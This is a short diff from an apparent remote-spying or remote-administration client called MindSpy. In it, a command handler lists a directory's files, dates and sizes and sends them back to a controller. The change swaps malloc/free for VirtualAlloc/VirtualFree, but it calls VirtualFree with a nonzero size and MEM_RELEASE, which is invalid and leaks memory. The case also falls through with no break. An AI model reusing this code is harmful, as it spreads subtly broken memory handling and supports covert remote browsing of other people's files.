@@ -118,7 +118,7 @@ namespace MindSpy
 				stFileInfoRequest * stfir = (stFileInfoRequest*)(szBuff +8);
 				stListaArchivos stla = fs.getDirContent(stfir->Path, stfir->Filtro, (ContentDir)stfir->Query, NULL);
 				DWORD SizeOfData = sizeof(UINT32) + stla.CantArchivos * (sizeof(WCHAR)*MAX_PATH) + (sizeof(long long) * 3);
-				BYTE*DataSend = (BYTE*)malloc(SizeOfData);
+				BYTE *DataSend = (BYTE*)VirtualAlloc(NULL, SizeOfData, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 				*(UINT32*)(DataSend) = stla.CantArchivos;
 				int OffsetWchar = sizeof(WCHAR)*MAX_PATH*stla.CantArchivos;
 				int OffsetLonglong = sizeof(long long) * stla.CantArchivos;
@@ -127,7 +127,7 @@ namespace MindSpy
 				memcpy(DataSend + sizeof(UINT32) + OffsetWchar + OffsetLonglong, stla.FechasModificacion, OffsetLonglong);
 				memcpy(DataSend + sizeof(UINT32) + OffsetWchar + OffsetLonglong*2, stla.Tamaños, OffsetLonglong);
 				EnviarComando(SizeOfData, CLNT_CMDS::FILEINFO, DataSend);
-				free(DataSend);
+				VirtualFree(DataSend, SizeOfData, MEM_RELEASE);
 			}
 
 			case CLNT_CMDS::NAME:
